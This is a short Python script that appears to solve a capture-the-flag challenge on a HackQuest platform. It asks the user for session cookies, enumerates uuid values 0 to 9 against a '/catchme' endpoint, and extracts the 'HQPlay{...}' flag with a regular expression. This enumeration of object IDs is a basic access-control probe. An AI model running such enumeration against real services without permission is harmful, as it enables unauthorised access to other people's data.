#!/usr/bin/env python
# =============================================================================
# Created By  : SANTHOS KUMAR (friendlyhacker_py)
# Created Date: Fri November 18 18:19:34 PDT 2021
# =============================================================================

import requests
import re 

xsrf=raw_input("enter the XSRF-TOKEN:")
sess=raw_input("enter the hackquest_play_session:")


cookie= {"XSRF-TOKEN": xsrf , "hackquest_play_session": sess}


for id in range(0,10):

  r= requests.get('https://play.tcshackquest.com/catchme', params={'uuid':id},cookies=cookie)
  pattern='HQPlay{.*}'
  flag=re.search(pattern,r.text)
  if flag !=None :
     print("\n")
     print("THE FLAG IS:")
     print((flag.group(0)))
     break 
else:
  print("no flag found")
   
